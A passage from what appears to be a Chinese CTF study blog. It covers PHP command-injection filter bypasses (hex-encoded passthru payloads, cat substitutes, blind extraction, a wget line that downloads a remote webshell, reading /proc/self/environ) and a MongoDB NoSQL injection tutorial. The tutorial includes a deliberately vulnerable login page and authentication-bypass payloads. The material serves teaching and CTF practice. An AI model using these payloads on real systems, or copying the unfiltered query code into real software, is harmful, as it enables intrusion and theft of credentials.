<h4 id="shellcode编码16进制的机器码"><a class="markdownIt-Anchor" href="#shellcode编码16进制的机器码"></a> shellcode编码（16进制的机器码）</h4>
<pre><code class="highlight plaintext">?cmd=passthru(&#x27;printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;|bash&#x27;);

?cmd=passthru(&#x27;`printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;`&#x27;);

?cmd=passthru(&#x27;$(printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#x27;);</code></pre>
<h2 id="读取命令被绕过"><a class="markdownIt-Anchor" href="#读取命令被绕过"></a> 读取命令被绕过：</h2>
<p>比如说过滤了cat，在这之前先分清:</p>
<p><code>cat flag.php</code> 是用于在终端上显示当前目录下名为 <code>flag.php</code> 的文件的内容。</p>
<p><code>cat /flag</code> 是用于在终端上显示根目录下名为 flag 的文件的内容。</p>
<p><code>cat flag</code> 是用于在终端上显示当前目录下名为 flag 的文件的内容。</p>
<p>正常来说flag放在根目录下，不过也可能是在当前网页目录下</p>
<p>别的指令也同理</p>
<ul>
<li>
<p>tac:反向显示，从最后一行开始往前显示</p>
<pre><code class="highlight plaintext">tac /flag</code></pre>
</li>
<li>
<p>more:一页一页显示档案内容</p>
<pre><code class="highlight plaintext">more flag.php</code></pre>
</li>
<li>
<p>less：与more类似</p>
</li>
<li>
<p>tail：查看末尾几行</p>
</li>
<li>
<p>nl：显示的时候，顺便输出行号</p>
<pre><code class="highlight plaintext">nl /flag</code></pre>
</li>
</ul>
<p><code>nl /flag</code> 和 <code>nl flag</code> 是不同的。</p>
<p>在 Linux 系统中，<code>nl</code>命令用于给文件添加行号。当使用 <code>nl /flag</code> 命令时，<code>/flag</code> 被视为一个文件路径，并将该文件的内容输出到标准输出（通常是终端），并在每一行前添加行号。如果 /flag 文件存在且有读取权限，那么 <code>nl /flag</code> 将会给该文件的内容添加行号。</p>
<p>而当使用 <code>nl flag</code> 命令时，flag 被视为一个相对于当前目录的文件路径。也就是说，<code>nl flag</code> 命令将会尝试在当前目录下找到名为 flag 的文件，并给其内容添加行号。（不过flag一般在根目录）</p>
<ul>
<li>od：以二进制方式读取档案内容。正常的<code>od /flag</code>输出的纯纯二进制<br>
想看到文件内容需要：</li>
</ul>
<pre><code class="highlight plaintext">passthru(&quot;od -A d -c /fla\g&quot;);</code></pre>
<ul>
<li>
<p>xxd：读取二进制文件</p>
<pre><code class="highlight plaintext">xxd /flag</code></pre>
</li>
<li>
<p>sort：主要用于排序文件</p>
<pre><code class="highlight plaintext">so?t /flag
/usr/bin/s?rt /flag</code></pre>
</li>
</ul>
<p><code>/usr/bin/sort</code> 和 <code>sort</code> 实际上是同一个命令。<code>/usr/bin</code> 目录是系统的标准目录之一，它包含了许多系统命令和工具的二进制文件，而 sort 命令通常就存放在 <code>/usr/bin</code> 目录中,因此<code>/usr/bin/sort /flag</code> 和 <code>sort /flag</code> 是等价的。有时候sort不行可能<code>/usr/bin/s?r</code>t可以</p>
<ul>
<li>uniq：报告或删除文件中重复的行，其实当成cat用就行</li>
<li>file -f:报错出具体内容<br>
passthru(“file -f /flag”);</li>
<li>grep：在文本中查找指定字符串<br>
passthru(“grep fla /fla*”);</li>
</ul>
<p>grep fla /fla* 命令会匹配根目录下所有以 fla 开头的文件（不包括子目录），然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令会搜索根目录下以 fla 开头的所有文件，并匹配其中包含 fla 字符串的行。</p>
<p>而 grep fla fla* 命令中 fla* 是当前目录下以 fla 开头的所有文件的通配符，它会匹配当前目录下所有以 fla 开头的文件，然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令只会搜索当前目录下以 fla 开头的文件，并匹配其中包含 fla 字符串的行。</p>
<ul>
<li>strings：<br>
相当于cat</li>
</ul>
<h2 id="无回显时间盲注"><a class="markdownIt-Anchor" href="#无回显时间盲注"></a> 无回显时间盲注：</h2>
<p>逻辑和SQL注入的时间盲注差不多</p>
<p>相关命令：<br>
1.sleep<br>
sleep 5       #5秒之后返回结果</p>
<p>2.awk：逐行获取数据<br>
3.cut -c<br>
cut命令逐列获取单个字符<br>
cat flag | awk NR<mark>2  | cut -c 1      #获取第一个字符<br>
cat flag | awk NR</mark>2  | cut -c 2      #获取第二个字符</p>
<p>3.利用cp命令：cp flag.php 1.txt</p>
<p>4.利用mv命令：mv flag.php 1.txt</p>
<p>5.利用&gt;输出结果到文件：ls &gt; 1.txt</p>
<p>6.tee:Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</p>
<p>7.利用wget下载：</p>
<pre><code class="highlight plaintext">wget http://ip/shell.txt &gt; shell.php或者wget http://ip/shell.txt -O shell.php</code></pre>
<p>8.dnslog外带数据</p>
<h2 id="都是fakeflag-试试环境变量procselfenviron和env指令"><a class="markdownIt-Anchor" href="#都是fakeflag-试试环境变量procselfenviron和env指令"></a> 都是fakeflag ,试试环境变量/proc/self/environ和env指令</h2>
]]></content>
      <tags>
        <tag>-Web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Nosql注入</title>
    <url>/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="n0sql"><a class="markdownIt-Anchor" href="#n0sql"></a> N0sql</h1>
<p>No only SQL,目前最流行的nosql产品是MongoDB</p>
<p>一种数据结构由键值对组成的文档</p>
<p>和json类似</p>
<pre><code class="highlight json"><span class="punctuation">&#123;</span>
    <span class="attr">&quot;_id&quot;</span> <span class="punctuation">:</span> ObjectId(<span class="string">&quot;60fa854cf8aaaf4f21049148&quot;</span>)<span class="punctuation">,</span>
    <span class="attr">&quot;name&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;whoami&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;description&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;the admin user&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;age&quot;</span> <span class="punctuation">:</span> <span class="number">19</span><span class="punctuation">,</span>
    <span class="attr">&quot;status&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;A&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;groups&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span>
        <span class="string">&quot;admins&quot;</span><span class="punctuation">,</span>
        <span class="string">&quot;users&quot;</span>
    <span class="punctuation">]</span>
<span class="punctuation">&#125;</span></code></pre>
<h2 id="mongodb-基础概念解析"><a class="markdownIt-Anchor" href="#mongodb-基础概念解析"></a> MongoDB 基础概念解析</h2>
<p>不管我们学习什么数据库都应该学习其中的基础概念，在 MongoDB 中基本的概念有文档、集合、数据库，如下表所示：</p>
<table>
<thead>
<tr>
<th>SQL 概念</th>
<th>MongoDB 概念</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>database</td>
<td>database</td>
<td>数据库</td>
</tr>
<tr>
<td>table</td>
<td>collection</td>
<td>数据库表/集合</td>
</tr>
<tr>
<td>row</td>
<td>document</td>
<td>数据记录行/文档</td>
</tr>
<tr>
<td>column</td>
<td>field</td>
<td>数据字段/域</td>
</tr>
<tr>
<td>index</td>
<td>index</td>
<td>索引</td>
</tr>
<tr>
<td>table joins</td>
<td></td>
<td>表连接，MongoDB 不支持</td>
</tr>
<tr>
<td>primary key</td>
<td>primary key</td>
<td>主键，MongoDB 自动将 <code>_id</code> 字段设置为主键</td>
</tr>
</tbody>
</table>
<p>下表列出了关系型数据库 RDBMS 与 MongoDB 之间对应的术语：</p>
<table>
<thead>
<tr>
<th>RDBMS</th>
<th>MongoDB</th>
</tr>
</thead>
<tbody>
<tr>
<td>数据库</td>
<td>数据库</td>
</tr>
<tr>
<td>表格</td>
<td>集合</td>
</tr>
<tr>
<td>行</td>
<td>文档</td>
</tr>
<tr>
<td>列</td>
<td>字段</td>
</tr>
<tr>
<td>表联合</td>
<td>嵌入文档</td>
</tr>
<tr>
<td>主键</td>
<td>主键（MongoDB 提供了 key 为 _id）</td>
</tr>
</tbody>
</table>
<h3 id="数据库database"><a class="markdownIt-Anchor" href="#数据库database"></a> 数据库（Database）</h3>
<p>个 MongoDB 中可以建立多个数据库。MongoDB 的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中。</p>
<p>使用 <code>show dbs</code> 命令可以显示所有数据库的列表：</p>
<pre><code class="highlight plaintext">$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
&gt; show dbs
admin   0.078GB
config  0.078GB
local   0.078GB
&gt;</code></pre>
<p>执行 <code>db</code> 命令可以显示当前数据库对象或集合：</p>
<pre><code class="highlight plaintext">$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
&gt; db
test
&gt;</code></pre>
<h3 id="文档document"><a class="markdownIt-Anchor" href="#文档document"></a> 文档（Document）</h3>
<p>文档是一组键值（key-value）对，类似于 RDBMS 关系型数据库中的一行。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点。</p>
<p>一个简单的文档例子如下：</p>
<pre><code class="highlight plaintext">&#123;&quot;name&quot;:&quot;whoami&quot;, &quot;age&quot;:19&#125;</code></pre>
<h3 id="集合collection"><a class="markdownIt-Anchor" href="#集合collection"></a> 集合（Collection）</h3>
<p>集合就是 MongoDB 文档组，类似于 RDBMS 关系数据库管理系统中的表格。集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据。</p>
<p>比如，我们可以将以下不同数据结构的文档插入到集合中：</p>
<pre><code class="highlight plaintext">&#123;&quot;name&quot;:&quot;whoami&quot;&#125;
&#123;&quot;name&quot;:&quot;bunny&quot;, &quot;age&quot;:19&#125;
&#123;&quot;name&quot;:&quot;bob&quot;, &quot;age&quot;:20, &quot;groups&quot;:[&quot;admins&quot;,&quot;users&quot;]&#125;</code></pre>
<p>当插入一个文档时，集合就会被自动创建。</p>
<p>如果我们要查看已有集合，可以使用 <code>show collections</code> 或 <code>show tables</code> 命令：</p>
<pre><code class="highlight plaintext">&gt; show collections
all_users
&gt; show tables
all_users
&gt;</code></pre>
<h2 id="mongodb基础操作"><a class="markdownIt-Anchor" href="#mongodb基础操作"></a> MongoDB基础操作</h2>
<h3 id="创建数据库"><a class="markdownIt-Anchor" href="#创建数据库"></a> 创建数据库</h3>
<pre><code class="highlight plaintext">use DATABASENAME</code></pre>
<p>一键创建；若已存在就连接并切换到指定数据库</p>
<h3 id="创建集合"><a class="markdownIt-Anchor" href="#创建集合"></a> 创建集合</h3>
<pre><code class="highlight plaintext">db.createCollection(name,options)</code></pre>
<ul>
<li>name：要创建的集合名称</li>
<li>options：可选参数，指定有关内存大小及索引的选项</li>
</ul>
<p>如下实例，我们在 users 数据库中创建一个 all_users 集合：</p>
<pre><code class="highlight plaintext">&gt; use users
switched to db users
&gt; db.createCollection(&quot;all_users&quot;)
&#123; &quot;ok&quot; : 1 &#125;
&gt;</code></pre>
<h3 id="插入文档"><a class="markdownIt-Anchor" href="#插入文档"></a> 插入文档</h3>
<pre><code class="highlight plaintext">db.COLLECTION_NAME.insert(document)</code></pre>
<p>如下实例，我们向存储在 users 数据库的 all_users 集合中插入一个文档：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.insert(&#123;name: &#x27;whoami&#x27;, 
    description: &#x27;the admin user&#x27;,
    age: 19,
    status: &#x27;A&#x27;,
    groups: [&#x27;admins&#x27;, &#x27;users&#x27;]
&#125;)</code></pre>
<p>我们也可以将文档数据定义为一个变量，然后再执行插入操作将变量插入。</p>
<h3 id="更新文档"><a class="markdownIt-Anchor" href="#更新文档"></a> 更新文档</h3>
<p>在 MongoDB 中我们可以使用 <code>update()</code> 或 <code>save()</code> 方法来更新集合中的文档。</p>
<ul>
<li><strong>update() 方法</strong></li>
</ul>
<p>update() 方法用于更新已存在的文档。语法格式如下：</p>
<pre><code class="highlight plaintext">db.collection.update(
   &lt;query&gt;,
   &lt;update&gt;,
   &#123;
     upsert: &lt;boolean&gt;,
     multi: &lt;boolean&gt;,
     writeConcern: &lt;document&gt;
   &#125;
)</code></pre>
<p>参数说明：</p>
<ul>
<li>query：update 操作的查询条件，类似 sql update 语句中 where 子句后面的内容。</li>
<li>update：update 操作的对象和一些更新的操作符（如 <code>$set</code>）等，可以理解为 sql update 语句中 set 关键字后面的内容。</li>
<li>multi：可选，默认是 false，只更新找到的第一条记录，如果这个参数为 true，就把按条件查出来多条记录全部更新。</li>
</ul>
<p>接着我们通过 update() 方法来将年龄 age 从 19 更新到 20：</p>
<pre><code class="highlight plaintext">&gt; db.lover.update(&#123;&#x27;age&#x27;:19&#125;, &#123;$set:&#123;&#x27;age&#x27;:20&#125;&#125;)
WriteResult(&#123; &quot;nMatched&quot; : 0, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 0 &#125;)
&gt;
&gt; db.all_users.find().pretty()
&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 20,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;
&gt;</code></pre>
<p>成功将 age 从 19 改为了 20。</p>
<p>以上语句只会修改第一条发现的文档，如果你要修改多条相同的文档，则需要设置 multi 参数为 true。</p>
<pre><code class="highlight plaintext">&gt; db.lover.update(&#123;&#x27;age&#x27;:&#x27;19&#x27;&#125;, &#123;$set:&#123;&#x27;age&#x27;:20&#125;&#125;, &#123;multi:true&#125;)</code></pre>
<ul>
<li><strong>save() 方法</strong></li>
</ul>
<p>save() 方法通过传入的文档来替换已有文档，<code>_id</code> 主键存在就更新，不存在就插入。语法格式如下：</p>
<pre><code class="highlight plaintext">db.collection.save(
   &lt;document&gt;,
   &#123;
     writeConcern: &lt;document&gt;
   &#125;
)</code></pre>
<p>参数说明：</p>
<ul>
<li>document：文档数据。</li>
</ul>
<p>如下实例中我们替换了 <code>_id</code> 为 60fa854cf8aaaf4f21049148 的文档数据：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.save(&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 21,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;)</code></pre>
<h3 id="查询文档"><a class="markdownIt-Anchor" href="#查询文档"></a> 查询文档</h3>
<pre><code class="highlight plaintext">db.collection.find(query,projection)</code></pre>
<p>参数说明：</p>
<ul>
<li>query：可选，使用查询操作符指定查询条件，相当于 sql select 语句中的 where 子句。</li>
<li>projection：可选，使用投影操作符指定返回的键。</li>
</ul>
<p>如下实例我们查询了集合 all_users 中的 age 为 20 的数据：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:&quot;20&quot;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;), &quot;name&quot; : &quot;whoami&quot;, &quot;description&quot; : &quot;the admin user&quot;, &quot;age&quot; : &quot;20&quot;, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;admins&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>
<p>如果你需要以易读的方式来读取数据，可以使用 <code>pretty()</code> 方法以格式化的方式来显示所有文档：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:20&#125;).pretty()
&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 20,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;
&gt;</code></pre>
<h4 id="mongodb-与-rdbms-之间的类比比较"><a class="markdownIt-Anchor" href="#mongodb-与-rdbms-之间的类比比较"></a> MongoDB 与 RDBMS 之间的类比比较</h4>
<p>如果你熟悉常规的 SQL 数据，通过下表可以更好的理解 MongoDB 的条件语句查询：</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>格式</th>
<th>范例</th>
<th>RDBMS 中的类似语句</th>
</tr>
</thead>
<tbody>
<tr>
<td>等于</td>
<td><code>&#123;&lt;key&gt;:&lt;value&gt;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;name&quot;:&quot;whoami&quot;&#125;).pretty()</code></td>
<td><code>where name = 'whoami'</code></td>
</tr>
<tr>
<td>小于</td>
<td><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lt:19&#125;&#125;).pretty()</code></td>
<td><code>where age &lt; 19</code></td>
</tr>
<tr>
<td>小于或等于</td>
<td><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lte:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &lt;= 19</code></td>
</tr>
<tr>
<td>大于</td>
<td><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &gt; 19</code></td>
</tr>
<tr>
<td>大于或等于</td>
<td><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gte:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &gt;= 19</code></td>
</tr>
<tr>
<td>不等于</td>
<td><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$ne:19&#125;&#125;).pretty()</code></td>
<td><code>where likes != 19</code></td>
</tr>
</tbody>
</table>
<p>而查询时的<strong>AND语句</strong>的表示即用<code>,</code>隔开多个键值对</p>
<p>语法格式如下：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;status&quot;:&quot;B&quot;, &quot;age&quot;:20&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ef8f8aaaf4f2104914e&quot;), &quot;name&quot; : &quot;bob&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 20, &quot;status&quot; : &quot;B&quot;, &quot;groups&quot; : [ &quot;normals&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>
<p>以上实例中类似于 RDBMS 中的 WHERE 语句：<code>WHERE status='B' AND age=20</code></p>
<p>查询时的<strong>OR语句</strong>要在开头加上<code>$or</code></p>
<p>语法格式如下：</p>
<pre><code class="highlight plaintext">&gt; db.col.find(
   &#123;
      $or: [
         &#123;key1: value1&#125;, &#123;key2:value2&#125;
      ]
   &#125;
).pretty()</code></pre>
<p>如下实例，我们查询键 <code>status</code> 值为 A 或键 <code>age</code> 值为 19 的文档。</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;$or:[&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:&quot;19&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ec6f8aaaf4f2104914c&quot;), &quot;name&quot; : &quot;bunny&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 19, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;lovers&quot;, &quot;users&quot; ] &#125;</code></pre>
<p>如下实例，我们查询键 <code>status</code> 值为 A 或键 <code>age</code> 值为 19 的文档。</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;$or:[&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:&quot;19&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ec6f8aaaf4f2104914c&quot;), &quot;name&quot; : &quot;bunny&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 19, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;lovers&quot;, &quot;users&quot; ] &#125;</code></pre>
<p><strong>联合使用</strong></p>
<p>以下实例演示了 AND 和 OR 联合使用，类似于 RDBMS 中的 WHERE 语句： <code>where age&gt;19 AND (name='whoami' OR status='A')</code></p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;, $or: [&#123;&quot;name&quot;:&quot;whoami&quot;&#125;, &#123;&quot;status&quot;:&quot;A&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9176f8aaaf4f21049150&quot;), &quot;name&quot; : &quot;whoami&quot;, &quot;description&quot; : &quot;the admin user&quot;, &quot;age&quot; : 20, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;admins&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>
<h2 id="注入时间到"><a class="markdownIt-Anchor" href="#注入时间到"></a> 注入时间到</h2>
<p>按照语言分类</p>
<p>可以分为</p>
<ul>
<li>PHP数组注入</li>
<li>js注入</li>
<li>mongoshell拼接注入</li>
</ul>
<p>按照攻击机制分类</p>
<p>可以分为</p>
<ul>
<li>重言式注入</li>
<li>联合查询注入</li>
<li>js注入</li>
<li>盲注</li>
</ul>
<hr>
<ul>
<li><strong>重言式注入</strong></li>
</ul>
<p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
<ul>
<li><strong>联合查询注入</strong></li>
</ul>
<p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
<ul>
<li><strong>JavaScript 注入</strong></li>
</ul>
<p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
<ul>
<li><strong>盲注</strong></li>
</ul>
<p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>
<h3 id="php中的注入"><a class="markdownIt-Anchor" href="#php中的注入"></a> PHP中的注入</h3>
<h4 id="重言式注入"><a class="markdownIt-Anchor" href="#重言式注入"></a> 重言式注入</h4>
<p>保证一个永真条件即可</p>
<p>首先在 MongoDB 中选中 test 数据库，创建一个 users 集合并插入文档数据：</p>
<pre><code class="highlight plaintext">&gt; use test
switched to db test
&gt;
&gt; db.createCollection(&#x27;users&#x27;)
&#123; &quot;ok&quot; : 1 &#125;
&gt;
&gt; db.users.insert(&#123;username: &#x27;admin&#x27;, password: &#x27;123456&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;whoami&#x27;, password: &#x27;657260&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;bunny&#x27;, password: &#x27;964795&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;bob&#x27;, password: &#x27;965379&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt;</code></pre>
<p>然后编写 index.php：</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager(&quot;mongodb://127.0.0.1:27017&quot;);
$username = $_POST[&#x27;username&#x27;];
$password = $_POST[&#x27;password&#x27;];

$query = new MongoDB\Driver\Query(array(
    &#x27;username&#x27; =&gt; $username,
    &#x27;password&#x27; =&gt; $password
));

$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();
$count = count($result);
if ($count &gt; 0) &#123;
    foreach ($result as $user) &#123;
        $user = ((array)$user);
        echo &#x27;====Login Success====&lt;br&gt;&#x27;;
        echo &#x27;username:&#x27; . $user[&#x27;username&#x27;] . &#x27;&lt;br&gt;&#x27;;
        echo &#x27;password:&#x27; . $user[&#x27;password&#x27;] . &#x27;&lt;br&gt;&#x27;;
    &#125;
&#125;
else&#123;
    echo &#x27;Login Failed&#x27;;
&#125;
?&gt;</code></pre>
<p>如下，当正常用户想要登陆 whoami 用户时，POST 方法提交的数据如下：</p>
<pre><code class="highlight plaintext">username=whoami&amp;password=657260</code></pre>
<p>进入 PHP 后的程序数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; &#x27;whoami&#x27;,
    &#x27;password&#x27; =&gt; &#x27;657260&#x27;
)</code></pre>
<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;whoami&#x27;, &#x27;password&#x27;:&#x27;657260&#x27;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;</code></pre>
<p>我们从代码中可以看出，这里对用户输入没有做任何过滤与校验，那么我们可以通过 <code>$ne</code> 关键字构造一个永真的条件就可以完成 NoSQL 注入：</p>
<pre><code class="highlight plaintext">username[$ne]=1&amp;password[$ne]=1</code></pre>
<p>如下图所示，成功查出所有的用户信息，说明成功注入了一个永真查询条件：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161640-790ad458-ec57-1.png" alt="20210724161640-790ad458-ec57-1"></p>
<p>提交的数据进入 PHP 后的数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1),
    &#x27;password&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1)
)</code></pre>
<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#123;$ne:1&#125;, &#x27;password&#x27;:&#123;$ne:1&#125;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c85257f18542b68c4ba&quot;), &quot;username&quot; : &quot;bunny&quot;, &quot;password&quot; : &quot;964795&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c88257f18542b68c4bb&quot;), &quot;username&quot; : &quot;bob&quot;, &quot;password&quot; : &quot;965379&quot; &#125;</code></pre>
<p>由于 users 集合中 username 和 password 都不等于 1，所以将所有的文档数据查出，这很可能是真实的，并且可能允许攻击者绕过身份验证。</p>
<p>对于 PHP 本身的特性而言，由于其松散的数组特性，导致如果我们发送 <code>value=1</code> 那么，也就是发送了一个 <code>value</code> 的值为 1 的数据。如果发送 <code>value[$ne]=1</code> 则 PHP 会将其转换为数组 <code>value=array($ne=&gt;1)</code>，当数据到了进入 MongoDB 后，原来一个单一的 <code>&#123;&quot;value&quot;:1&#125;</code> 查询就变成了一个 <code>&#123;&quot;value&quot;:&#123;$ne:1&#125;</code> 条件查询。同样的，我们也可以使用下面这些作为 payload 进行攻击：</p>
<pre><code class="highlight plaintext">username[$ne]=&amp;password[$ne]=
username[$gt]=&amp;password[$gt]=
username[$gte]=&amp;password[$gte]=</code></pre>
<p>这种重言式注入的方式也是我们通常用来验证网站是否存在 NoSQL 注入的第一步。</p>
<h4 id="联合查询注入"><a class="markdownIt-Anchor" href="#联合查询注入"></a> 联合查询注入</h4>
<p>在 MongoDB 之类的流行数据存储中，JSON 查询结构使得联合查询注入攻击变得比较复杂了，但也是可以实现的。</p>
<p>我们都知道，直接对 SQL 查询语句进行字符拼接串容易造成 SQL 注入，NoSQL 也有类似问题。如下实例，假设后端的 MongoDB 查询语句使用了字符串拼接：</p>
<pre><code class="highlight plaintext">string query =&quot;&#123; username: &#x27;&quot; + $username + &quot;&#x27;, password: &#x27;&quot; + $password + &quot;&#x27; &#125;&quot;</code></pre>
<p>当用户正确的用户名密码进行登录时，得到的查询语句是应该这样的：</p>
<pre><code class="highlight plaintext">&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#x27;123456&#x27;&#125;</code></pre>
<p>如果此时没有很好地对用户的输入进行过滤或者效验，那攻击者便可以构造如下 payload：</p>
<pre><code class="highlight plaintext">username=admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;: &#x27;a&amp;password=&#x27; &#125;], $comment: &#x27;123456</code></pre>
<p>拼接入查询语句后相当于执行了：</p>
<pre><code class="highlight plaintext">&#123; username: &#x27;admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;:&#x27;a&#x27;, password: &#x27;&#x27; &#125;], $comment: &#x27;123456&#x27;&#125;</code></pre>
<p>此时，只要用户名是正确的，这个查询就可以成功。这种手法和 SQL 注入比较相似：</p>
<pre><code class="highlight plaintext">select * from logins where username = &#x27;admin&#x27; and (password true&lt;&gt; or (&#x27;a&#x27;=&#x27;a&#x27; and password = &#x27;&#x27;))</code></pre>
